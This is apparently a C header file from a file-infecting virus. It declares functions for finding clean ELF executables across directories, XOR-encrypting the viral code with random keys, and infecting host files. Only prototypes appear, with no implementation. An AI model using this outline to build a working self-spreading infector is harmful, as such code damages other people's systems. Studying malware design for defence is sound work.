#ifndef INFECTION_H
#define INFECTION_H


/// INFO 

void infectDifferentDirectories(char* argv[]);


/// CORE

void b_xor(unsigned char* xorcode, size_t size);
void encrypt_code(unsigned char* xorcode, size_t size, unsigned char* key, size_t keylen);
unsigned char* generateRandomKey(size_t size);
unsigned char* generateRandomIV();
char* getCleanHostFile(int self_inode);
int isELF(char* fileName);
int isClean(char* fileName);
void infectHostFile(char* hostFileName, int vfd);

#endif  // INFECTION_H
